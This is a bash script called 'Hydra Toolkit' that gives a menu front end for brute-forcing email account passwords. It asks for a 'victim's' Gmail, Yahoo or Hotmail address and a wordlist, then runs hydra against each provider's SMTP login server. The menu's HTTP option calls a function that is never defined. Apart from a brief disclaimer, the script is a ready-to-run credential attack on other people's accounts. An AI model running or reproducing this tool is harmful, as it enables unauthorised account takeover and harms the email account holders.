#! /bin/bash
#veil

#Colours
   
   red="\033[1;31m"
   yellow="\033[1;33m"
   blue="\033[1;34m"
   green="\033[1;32m"
   transparent="\e[0m"

   if [[ $EUID -ne 0 ]]; then
        echo -e "\e[1;31mYou don't have admin privilegies, execute the script as root or with sudo""\e[0m"""
        exit 1
fi

if [ -z "${DISPLAY:-}" ]; then
    echo -e "\e[1;31mThe script should be executed inside a X (graphical) session.""\e[0m"""
    exit 1
fi

clear

trap close SIGINT SIGHUP

function close() {
	clear
	exit
}

function dependencestop() {
  echo -e $red
echo -e " checking dependences"
echo -e "----------------------"
echo 

}

function checkdependences() {
  echo -ne "Hydra........"
  if ! hash hydra 2>/dev/null; then
    echo -e "\e[1;31mNot installed"$transparent"" 
      exit=1
    
  else
    echo -e "\e[1;32mOK!"$transparent""
  fi

  if [ "$exit" = "1" ]; then
  xterm -T "Installing Hydra" -geometry 100x30 -e "sudo apt-get install hydra -y"
  clear 
  top
  dependencestop
  echo -e "hydra.......\e[1;32mOK!"$transparent""
  fi
  
}

#title
function top() {
echo -e " _    _           _             _______          _   _  ___ _   "
echo -e "| |  | |         | |           |__   __|        | | | |/ (_) |  "
echo -e "| |__| |_   _  __| |_ __ __ _     | | ___   ___ | | | ' / _| |_ "
echo -e "|  __  | | | |/ _  |  __/ _  |    | |/ _ \ / _ \| | |  < | | __|"
echo -e "| |  | | |_| | (_| | | | (_| |    | | (_) | (_) | | | . \| | |_ "
echo -e "|_|  |_|\__  |\__ _|_|  \__ _|    |_|\___/ \___/|_| |_|\_\_|\__|"
echo -e "         __/ |                                                  "
echo -e "        |___/                                 by veil"
echo -e ""$red"NOTE: Make sure you have wordlists!"$transparent

}

function email() {
clear
top
echo
echo -e ""$blue"Choose an SMTP service"$transparent
echo 
echo -e ""$red"    ["$green"1"$red"] "$green"Gmail"$transparent
echo -e ""$red"    ["$green"2"$red"] "$green"Yahoo"$transparent
echo -e ""$red"    ["$green"3"$red"] "$green"Hotmail"$transparent
echo -e ""$blue"   ["$red"4"$blue"] "$blue"back to main menu"$transparent
echo
echo -n -e ""$red" ["$green"email"$red"]>>>"$transparent
read smtp
case "$smtp" in 
	1 )gmail ;;
	2 )yahoo ;;
	3 )hotmail ;;
  4 )main;;
	* )echo -e "invalid input" 
 	esac
}

function gmail() {
	clear
	top
	echo -e "$blue"
echo -e "---------------------------------------------"
echo -e "| Please Enter The Victiom's Email Address  |"
echo -e "---------------------------------------------"$transparent
echo
echo
echo
echo
echo
echo -n -e ""$red" ["$green"Gmail"$red"]>>>"$transparent
read email
clear 
top
echo -e ""$blue"-----------------------------------------------"
echo -e "| Provide Directory of Wordlist for Passwords |"
echo -e "-----------------------------------------------"$transparent
echo
echo
echo
echo
echo
echo -n -e ""$red" ["$green"Gmail"$red"]>>>"$transparent
read wordlist
sudo hydra -S -l $email -P $wordlist -e ns -V -s 465 smtp.gmail.com smtp

}

function yahoo() {
	clear
	top
  echo -e "$blue"
echo -e "---------------------------------------------"
echo -e "| Please Enter The Victiom's Email Address  |"
echo -e "---------------------------------------------"$transparent
echo
echo
echo
echo
echo
echo -n -e ""$red"["$green"Yahoo"$red"]>>>"$transparent
read email
	clear
	top
echo -e ""$blue"-----------------------------------------------"
echo -e "| Provide Directory of Wordlist for Passwords |"
echo -e "-----------------------------------------------"$transparent
echo
echo
echo
echo
echo
echo -n -e ""$red"["$green"Yahoo"$red"]>>>"$transparent
read wordlist
sudo hydra -S -l $email -P $wordlist -e ns -V -s 465 smtp.mail.yahoo.com smtp


}

function hotmail() {
	clear
	top
  echo -e "$blue"
echo -e "---------------------------------------------"
echo -e "| Please Enter The Victiom's Email Address  |"
echo -e "---------------------------------------------"$transparent
echo
echo
echo
echo
echo
echo -n -e ""$red"["$green"Hotmail"$red"]>>>"$transparent
read email
echo -e ""$blue"-----------------------------------------------"
echo -e "| Provide Directory of Wordlist for Passwords |"
echo -e "-----------------------------------------------"$transparent
echo
echo
echo
echo
echo
echo -n -e ""$red"["$green"Hotmail"$red"]>>>"$transparent
read wordlist
sudo hydra -S -l $email -P $wordlist -e ns -V -s 465 smtp.live.com smtp
}



function main() {
    clear
    top
    echo
    echo
    echo -e ""$blue"[i] What Function Would You Like To Use?"
    echo
    echo
    echo -e ""$red"    ["$green"1"$red"] "$green"SMTP"$transparent
    echo -e ""$red"    ["$green"2"$red"] "$green"HTTP"$transparent
    echo
    echo
    echo -n -e ""$red" ["$green"-"$red"]>>>"$transparent
    read smtp
    case "$smtp" in 
      1 )email;;
      2 )http;;
      * )echo -e "invalid input"   
    esac
}

clear
  whiptail --title "Hydra Toolkit Disclaimer" --msgbox "Hydra Toolkit is intended to be used for legal security purposes only, Only use this tool servrers you own or have permission to use it on. Don't be a cunt." 10 50
clear
sleep 0.1 && echo -e " _    _           _             _______          _   _  ___ _   "
sleep 0.1 && echo -e "| |  | |         | |           |__   __|        | | | |/ (_) |  "
sleep 0.1 && echo -e "| |__| |_   _  __| |_ __ __ _     | | ___   ___ | | | ' / _| |_ "
sleep 0.1 && echo -e "|  __  | | | |/ _  |  __/ _  |    | |/ _ \ / _ \| | |  < | | __|"
sleep 0.1 && echo -e "| |  | | |_| | (_| | | | (_| |    | | (_) | (_) | | | . \| | |_ "
sleep 0.1 && echo -e "|_|  |_|\__  |\__ _|_|  \__ _|    |_|\___/ \___/|_| |_|\_\_|\__|"
sleep 0.1 && echo -e "         __/ |                                                  "
sleep 0.1 && echo -e "        |___/                                 by veil "





  sleep 1
    dependencestop
    sleep 1
    checkdependences
    sleep 3
    clear
main
